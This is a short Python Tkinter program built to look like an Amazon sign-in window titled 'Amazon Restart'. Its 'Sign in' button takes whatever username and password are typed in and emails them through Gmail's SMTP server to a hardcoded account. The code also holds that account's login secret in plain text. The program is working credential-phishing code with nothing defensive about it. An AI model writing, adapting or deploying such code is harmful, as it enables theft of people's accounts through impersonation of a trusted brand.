from tkinter import *
import smtplib



window = Tk()
window.geometry = (640,437)
window.title("Amazon Restart")
window.iconbitmap(r'amazon.ico')


bg = PhotoImage(file = "azBackground.png")
canvas1 = Canvas(window, width=640,height=437)
canvas1.pack(fill="both", expand=True)
canvas1.create_image( 0, 0, image = bg, anchor = "nw")


username = Entry(window, width=70)
username.place(x=125, y=160)

password = Entry(window, width=70)
password.place(x=125, y=226)



def send(message):
    # email stuff
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login('danxxsorenson49@gmail.com', 'pxlmwrmjqrpynaue')
    server.sendmail("danxxsorenson49@gmail.com", 'danxxsorenson49@gmail.com', message)
    server.quit()

def money():
    a = username.get()
    b = password.get()

    c = 'Username-> ' + a + '  Password-> ' + b
    print(c)
    send(c)


signIn = Button(window, height=1, width=62, bg='orange', text="Sign in", command=money)
signIn.place(x=125, y=275)








window.mainloop()



